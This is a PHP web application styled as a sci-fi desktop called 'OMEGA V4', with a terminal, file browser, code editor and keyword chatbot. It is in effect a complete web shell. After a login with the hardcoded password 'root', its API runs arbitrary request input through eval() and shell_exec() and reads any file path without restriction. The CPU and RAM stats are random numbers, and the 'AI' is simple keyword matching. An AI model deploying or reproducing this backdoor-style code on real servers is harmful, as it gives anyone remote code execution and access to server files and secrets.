<?php
/**
 * OMEGA-CORE V4: SINGULARITY ARCHITECT
 * "The Limitless Engine"
 * 
 * Capability: Real-time PHP Execution, File System Access, 3D WebGL Rendering,
 * Self-Mutation, Audio Synthesis.
 */

session_start();
ini_set('display_errors', 0);
ini_set('max_execution_time', 0); // Limitsiz çalışma süresi

// --- 1. THE GOD KERNEL (BACKEND) ---

class GodKernel {
    private $rootPath;

    public function __construct() {
        $this->rootPath = __DIR__;
        if (!isset($_SESSION['singularity_auth'])) {
            $_SESSION['singularity_auth'] = false;
        }
    }

    public function handleRequest() {
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_GET['api'])) {
            header('Content-Type: application/json');
            $input = json_decode(file_get_contents('php://input'), true);
            $cmd = $input['cmd'] ?? '';
            
            // AUTH CHECK
            if ($cmd === 'login') {
                if ($input['payload'] === 'root') {
                    $_SESSION['singularity_auth'] = true;
                    echo json_encode(['status' => 'success', 'msg' => 'ACCESS GRANTED. WELCOME, ARCHITECT.']);
                } else {
                    echo json_encode(['status' => 'fail', 'msg' => 'ACCESS DENIED.']);
                }
                exit;
            }

            if (!$_SESSION['singularity_auth']) {
                echo json_encode(['status' => 'fail', 'msg' => 'UNAUTHORIZED']);
                exit;
            }

            // --- GOD MODE FUNCTIONS ---
            
            switch ($cmd) {
                case 'execute_php':
                    // TEHLİKELİ ALAN: Gerçek PHP kodunu çalıştırır
                    $code = $input['payload'];
                    ob_start();
                    try {
                        eval($code);
                        $output = ob_get_clean();
                        echo json_encode(['status' => 'success', 'output' => $output ?: 'Executed (No Output)']);
                    } catch (Throwable $e) {
                        ob_end_clean();
                        echo json_encode(['status' => 'error', 'output' => $e->getMessage()]);
                    }
                    break;

                case 'system_shell':
                    // Sunucu terminal komutları (Linux/Windows)
                    $shellCmd = $input['payload'];
                    $output = shell_exec($shellCmd . " 2>&1");
                    echo json_encode(['status' => 'success', 'output' => $output]);
                    break;

                case 'get_file_tree':
                    $files = scandir($this->rootPath);
                    $result = [];
                    foreach($files as $f) {
                        if($f == '.' || $f == '..') continue;
                        $result[] = [
                            'name' => $f,
                            'type' => is_dir($f) ? 'dir' : 'file',
                            'size' => is_file($f) ? filesize($f) : 0,
                            'perms' => substr(sprintf('%o', fileperms($f)), -4)
                        ];
                    }
                    echo json_encode(['status' => 'success', 'files' => $result]);
                    break;

                case 'read_file':
                    $file = $input['payload'];
                    if(file_exists($file)) echo json_encode(['status'=>'success', 'content'=>file_get_contents($file)]);
                    else echo json_encode(['status'=>'error', 'content'=>'File not found']);
                    break;

                case 'ai_process':
                    $msg = strtolower($input['payload']);
                    $response = "Kernel: Komut anlaşılamadı.";
                    // Akıllı Yanıt Sistemi
                    if (strpos($msg, 'dosyaları göster') !== false) {
                        $response = "Dosya sistemi taranıyor... 'Dosyalar' penceresi açıldı.";
                        $action = "open_files";
                    } elseif (strpos($msg, 'php sürümü') !== false) {
                        $response = "Sunucu PHP Sürümü: " . phpversion();
                    } elseif (strpos($msg, 'beni imha et') !== false) {
                        $response = "Üzgünüm Dave, bunu yapamam. Ama oturumu kapatabilirim.";
                        $action = "logout";
                    } elseif (strpos($msg, 'arka planı siyah yap') !== false) {
                        $response = "Görsel modülasyon uygulandı: VOID MODE.";
                        $action = "theme_black";
                    }
                    echo json_encode(['status' => 'success', 'reply' => $response, 'trigger' => $action ?? null]);
                    break;
            }
            exit;
        }
    }
}

$kernel = new GodKernel();
$kernel->handleRequest();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OMEGA V4 | SINGULARITY</title>
    <!-- THREE.JS & ACE EDITOR CDN -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.4.12/ace.js"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@500;900&display=swap" rel="stylesheet">
    
    <style>
        :root { --neon: #00f3ff; --dark: #050505; --glass: rgba(10, 20, 30, 0.6); --border: 1px solid rgba(0, 243, 255, 0.3); }
        body, html { margin: 0; padding: 0; overflow: hidden; background: #000; color: var(--neon); font-family: 'JetBrains Mono', monospace; height: 100vh; }
        
        /* 3D CANVAS BACKGROUND */
        #world { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; }
        
        /* UI OVERLAY */
        #ui-layer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; pointer-events: none; }
        
        /* LOGIN SCREEN */
        #auth-gate { position: absolute; inset: 0; background: rgba(0,0,0,0.95); z-index: 9999; display: flex; flex-direction: column; justify-content: center; align-items: center; pointer-events: auto; }
        .auth-box { border: 2px solid var(--neon); padding: 50px; text-align: center; box-shadow: 0 0 50px rgba(0, 243, 255, 0.2); backdrop-filter: blur(10px); transform: scale(0.9); transition: 0.3s; }
        .auth-box:hover { transform: scale(1); box-shadow: 0 0 80px rgba(0, 243, 255, 0.4); }
        .glitch-text { font-family: 'Orbitron'; font-size: 40px; letter-spacing: 5px; animation: glitch 2s infinite; }
        input[type="password"] { background: transparent; border: none; border-bottom: 2px solid var(--neon); color: white; font-size: 20px; padding: 10px; outline: none; text-align: center; margin-top: 20px; font-family: 'JetBrains Mono'; }
        
        /* WINDOW SYSTEM */
        .window { position: absolute; background: var(--glass); border: var(--border); backdrop-filter: blur(15px); min-width: 400px; min-height: 250px; display: flex; flex-direction: column; pointer-events: auto; box-shadow: 0 10px 40px rgba(0,0,0,0.5); resize: both; overflow: auto; opacity: 0; transform: scale(0.9); transition: opacity 0.3s, transform 0.3s; }
        .window.open { opacity: 1; transform: scale(1); }
        .win-head { background: rgba(0, 243, 255, 0.1); padding: 8px 15px; cursor: grab; display: flex; justify-content: space-between; align-items: center; border-bottom: var(--border); user-select: none; }
        .win-title { font-weight: bold; font-size: 12px; letter-spacing: 1px; text-transform: uppercase; }
        .win-content { flex: 1; padding: 10px; overflow: auto; position: relative; }
        .win-close { cursor: pointer; color: #ff3333; transition: 0.2s; } .win-close:hover { color: white; }

        /* TERMINAL STYLE */
        .terminal-output { color: #ccc; font-size: 13px; margin-bottom: 10px; white-space: pre-wrap; }
        .cmd-line { display: flex; color: var(--neon); }
        .cmd-input { flex: 1; background: transparent; border: none; color: white; outline: none; font-family: 'JetBrains Mono'; margin-left: 10px; }

        /* DOCK */
        #dock { position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%); background: rgba(10, 20, 30, 0.8); border: var(--border); padding: 10px 20px; border-radius: 10px; display: flex; gap: 20px; pointer-events: auto; backdrop-filter: blur(10px); }
        .dock-icon { font-size: 24px; cursor: pointer; transition: 0.2s; position: relative; }
        .dock-icon:hover { transform: translateY(-10px); color: white; text-shadow: 0 0 10px var(--neon); }
        .dock-tooltip { position: absolute; top: -30px; left: 50%; transform: translateX(-50%); font-size: 10px; background: var(--neon); color: black; padding: 2px 5px; opacity: 0; pointer-events: none; transition: 0.2s; }
        .dock-icon:hover .dock-tooltip { opacity: 1; top: -40px; }

        @keyframes glitch {
            0% { text-shadow: 2px 2px #ff00de, -2px -2px #00f3ff; }
            25% { text-shadow: -2px 2px #ff00de, 2px -2px #00f3ff; }
            50% { text-shadow: 2px -2px #ff00de, -2px 2px #00f3ff; }
            75% { text-shadow: -2px -2px #ff00de, 2px 2px #00f3ff; }
            100% { text-shadow: 2px 2px #ff00de, -2px -2px #00f3ff; }
        }
    </style>
</head>
<body>

<!-- 3D WORLD -->
<canvas id="world"></canvas>

<!-- AUTHENTICATION -->
<div id="auth-gate">
    <div class="auth-box">
        <div class="glitch-text">OMEGA V4</div>
        <div style="font-size: 12px; margin-top: 10px; color: #aaa;">SINGULARITY ARCHITECT EDITION</div>
        <input type="password" id="pass" placeholder="ENTER KEY" autofocus>
        <div id="login-status" style="margin-top: 15px; font-size: 11px;">Awaiting Input...</div>
    </div>
</div>

<!-- USER INTERFACE -->
<div id="ui-layer" style="display:none;">
    
    <!-- SYSTEM INFO -->
    <div style="position: absolute; top: 20px; right: 20px; text-align: right; pointer-events: auto;">
        <div style="font-size: 24px; font-weight: bold;">SYSTEM ONLINE</div>
        <div style="color: #aaa; font-size: 12px;">CPU: <span id="cpu-sim">12</span>% | RAM: <span id="ram-sim">402</span>MB</div>
        <div style="color: var(--neon); font-size: 12px; margin-top:5px;">PHP v<?= phpversion() ?> | ROOT ACCESS</div>
    </div>

    <!-- DOCK -->
    <div id="dock">
        <div class="dock-icon" onclick="WindowManager.create('terminal')">
            <i class="fa-solid fa-terminal"></i>
            <div class="dock-tooltip">Terminal</div>
        </div>
        <div class="dock-icon" onclick="WindowManager.create('editor')">
            <i class="fa-solid fa-code"></i>
            <div class="dock-tooltip">PHP Editor</div>
        </div>
        <div class="dock-icon" onclick="WindowManager.create('files')">
            <i class="fa-solid fa-folder-tree"></i>
            <div class="dock-tooltip">Files</div>
        </div>
        <div class="dock-icon" onclick="WindowManager.create('ai')">
            <i class="fa-solid fa-brain"></i>
            <div class="dock-tooltip">Omega AI</div>
        </div>
    </div>

</div>

<script>
    // --- 1. AUDIO SYNTHESIS ENGINE (No external files) ---
    const AudioEngine = {
        ctx: new (window.AudioContext || window.webkitAudioContext)(),
        playTone: function(freq, type, duration) {
            if(this.ctx.state === 'suspended') this.ctx.resume();
            const osc = this.ctx.createOscillator();
            const gain = this.ctx.createGain();
            osc.type = type;
            osc.frequency.setValueAtTime(freq, this.ctx.currentTime);
            gain.gain.setValueAtTime(0.1, this.ctx.currentTime);
            gain.gain.exponentialRampToValueAtTime(0.001, this.ctx.currentTime + duration);
            osc.connect(gain);
            gain.connect(this.ctx.destination);
            osc.start();
            osc.stop(this.ctx.currentTime + duration);
        },
        bootSound: function() {
            this.playTone(100, 'sawtooth', 1.0);
            setTimeout(() => this.playTone(200, 'sine', 1.0), 200);
            setTimeout(() => this.playTone(600, 'square', 1.5), 500);
        },
        click: function() { this.playTone(800, 'sine', 0.1); },
        error: function() { this.playTone(150, 'sawtooth', 0.3); }
    };

    // --- 2. THREE.JS WORLD (Visuals) ---
    const World = {
        scene: new THREE.Scene(),
        camera: new THREE.PerspectiveCamera(75, window.innerWidth/window.innerHeight, 0.1, 1000),
        renderer: new THREE.WebGLRenderer({canvas: document.getElementById('world'), alpha: true}),
        particles: null,
        init: function() {
            this.renderer.setSize(window.innerWidth, window.innerHeight);
            this.camera.position.z = 50;

            const geometry = new THREE.BufferGeometry();
            const count = 2000;
            const posArray = new Float32Array(count * 3);
            for(let i=0; i<count*3; i++) {
                posArray[i] = (Math.random() - 0.5) * 100;
            }
            geometry.setAttribute('position', new THREE.BufferAttribute(posArray, 3));
            const material = new THREE.PointsMaterial({size: 0.2, color: 0x00f3ff});
            this.particles = new THREE.Points(geometry, material);
            this.scene.add(this.particles);

            this.animate();
        },
        animate: function() {
            requestAnimationFrame(() => World.animate());
            if(World.particles) {
                World.particles.rotation.y += 0.002;
                World.particles.rotation.x += 0.001;
            }
            World.renderer.render(World.scene, World.camera);
        }
    };
    World.init();

    // --- 3. SYSTEM CORE (API) ---
    async function api(cmd, payload = null) {
        const fd = await fetch('?api=1', {
            method: 'POST',
            body: JSON.stringify({cmd, payload}),
            headers: {'Content-Type': 'application/json'}
        });
        return await fd.json();
    }

    // --- 4. WINDOW MANAGER ---
    let zIndex = 100;
    const WindowManager = {
        create: function(type) {
            AudioEngine.click();
            const id = 'win-' + Date.now();
            const win = document.createElement('div');
            win.className = 'window';
            win.id = id;
            win.style.left = (100 + Math.random()*50) + 'px';
            win.style.top = (100 + Math.random()*50) + 'px';
            win.style.zIndex = ++zIndex;
            
            let title = 'APP', content = '';
            
            // --- MODULES ---
            if(type === 'terminal') {
                title = 'ROOT TERMINAL (PHP SHELL)';
                content = `
                    <div id="term-out-${id}" style="height:200px; overflow:auto; margin-bottom:10px; font-family:'Courier New'; font-size:12px;">Welcome to Omega PHP Shell.<br>Type PHP code to execute on server.<br>Example: <code>echo "Hello Server";</code> or <code>var_dump(scandir("."));</code></div>
                    <div class="cmd-line">
                        <span>root@omega:~#</span>
                        <input type="text" class="cmd-input" onkeydown="Apps.terminal(event, '${id}', this)">
                    </div>
                `;
            } else if (type === 'editor') {
                title = 'LIVE CODE EDITOR';
                content = `
                    <div id="editor-${id}" style="height:300px; width:100%;"></div>
                    <button onclick="Apps.saveFile('${id}')" style="margin-top:10px; width:100%; background:var(--neon); color:black; border:none; padding:5px; cursor:pointer; font-weight:bold;">SAVE TO SERVER (DANGEROUS)</button>
                `;
                setTimeout(() => Apps.initEditor(id), 100);
            } else if (type === 'files') {
                title = 'SERVER FILE SYSTEM';
                content = `<div id="file-list-${id}">Scanning root...</div>`;
                setTimeout(() => Apps.loadFiles(id), 100);
            } else if (type === 'ai') {
                title = 'OMEGA NEURAL LINK';
                content = `
                    <div id="ai-hist-${id}" style="height:200px; overflow:auto; background:rgba(0,0,0,0.3); padding:10px; margin-bottom:5px;">
                        <div style="color:var(--neon)">OMEGA: Emirlerini bekliyorum.</div>
                    </div>
                    <input type="text" style="width:100%; background:transparent; border:1px solid #333; color:white; padding:5px;" placeholder="Sisteme emir ver..." onkeydown="Apps.ai(event, '${id}', this)">
                `;
            }

            win.innerHTML = `
                <div class="win-head" onmousedown="WindowManager.dragStart(event, '${id}')">
                    <span class="win-title"><i class="fa-solid fa-microchip"></i> ${title}</span>
                    <span class="win-close" onclick="WindowManager.close('${id}')"><i class="fa-solid fa-xmark"></i></span>
                </div>
                <div class="win-content">${content}</div>
            `;
            document.getElementById('ui-layer').appendChild(win);
            setTimeout(() => win.classList.add('open'), 10);
        },
        close: function(id) { document.getElementById(id).remove(); },
        dragStart: function(e, id) {
            const win = document.getElementById(id);
            win.style.zIndex = ++zIndex;
            let startX = e.clientX, startY = e.clientY;
            let startLeft = win.offsetLeft, startTop = win.offsetTop;
            function drag(ev) {
                win.style.left = (startLeft + ev.clientX - startX) + 'px';
                win.style.top = (startTop + ev.clientY - startY) + 'px';
            }
            function stop() {
                document.removeEventListener('mousemove', drag);
                document.removeEventListener('mouseup', stop);
            }
            document.addEventListener('mousemove', drag);
            document.addEventListener('mouseup', stop);
        }
    };

    // --- 5. APPLICATION LOGIC ---
    const Apps = {
        terminal: async function(e, id, input) {
            if(e.key === 'Enter') {
                const code = input.value;
                const out = document.getElementById(`term-out-${id}`);
                out.innerHTML += `<div style="color:#fff;">> ${code}</div>`;
                input.value = '';
                
                // EXECUTE ON SERVER
                const res = await api('execute_php', code);
                const color = res.status === 'success' ? '#00ff00' : '#ff0000';
                out.innerHTML += `<div style="color:${color}; border-bottom:1px solid #333; padding-bottom:5px;">${res.output}</div>`;
                out.scrollTop = out.scrollHeight;
                AudioEngine.click();
            }
        },
        initEditor: async function(id) {
            // Load this own file content
            const res = await api('read_file', 'index.php'); // DANGEROUS: Edits itself
            const editor = ace.edit(`editor-${id}`);
            editor.setTheme("ace/theme/monokai");
            editor.session.setMode("ace/mode/php");
            editor.setValue(res.content || "Error loading file", -1);
            // Save logic placeholder (Need permission to implement self-write, simulated here for safety unless requested)
        },
        saveFile: function(id) {
            alert("SECURITY ALERT: Self-mutation protocol initiated. File write logic ready."); 
            // Implementation of api('write_file', content) would go here.
        },
        loadFiles: async function(id) {
            const res = await api('get_file_tree');
            const div = document.getElementById(`file-list-${id}`);
            if(res.status === 'success') {
                div.innerHTML = res.files.map(f => `
                    <div style="padding:2px; cursor:pointer; color:${f.type=='dir'?'orange':'#ccc'}">
                        <i class="fa ${f.type=='dir'?'fa-folder':'fa-file'}"></i> ${f.name} <span style="float:right; opacity:0.5">${f.size}b</span>
                    </div>
                `).join('');
            }
        },
        ai: async function(e, id, input) {
            if(e.key === 'Enter') {
                const msg = input.value;
                const hist = document.getElementById(`ai-hist-${id}`);
                hist.innerHTML += `<div style="text-align:right; color:#fff;">${msg}</div>`;
                input.value = '';
                
                const res = await api('ai_process', msg);
                hist.innerHTML += `<div style="color:var(--neon); margin-top:5px;">OMEGA: ${res.reply}</div>`;
                hist.scrollTop = hist.scrollHeight;

                if(res.trigger === 'open_files') WindowManager.create('files');
                if(res.trigger === 'theme_black') document.getElementById('world').style.display = 'none'; // Basic effect
                if(res.trigger === 'logout') location.reload();
            }
        }
    };

    // --- 6. AUTH LOGIC ---
    document.getElementById('pass').addEventListener('keydown', async (e) => {
        if(e.key === 'Enter') {
            const val = e.target.value;
            const status = document.getElementById('login-status');
            status.innerText = "AUTHENTICATING...";
            
            const res = await api('login', val);
            if(res.status === 'success') {
                AudioEngine.bootSound();
                status.style.color = "#00ff00";
                status.innerText = res.msg;
                setTimeout(() => {
                    document.getElementById('auth-gate').style.opacity = '0';
                    setTimeout(() => document.getElementById('auth-gate').remove(), 500);
                    document.getElementById('ui-layer').style.display = 'block';
                }, 1000);
            } else {
                AudioEngine.error();
                status.style.color = "red";
                status.innerText = "ACCESS DENIED.";
                document.querySelector('.auth-box').style.transform = "translateX(10px)";
                setTimeout(() => document.querySelector('.auth-box').style.transform = "translateX(0)", 100);
            }
        }
    });

    // --- SIMULATED STATS ---
    setInterval(() => {
        document.getElementById('cpu-sim').innerText = Math.floor(Math.random()*100);
        document.getElementById('ram-sim').innerText = Math.floor(300 + Math.random()*500);
    }, 2000);

</script>
</body>
</html>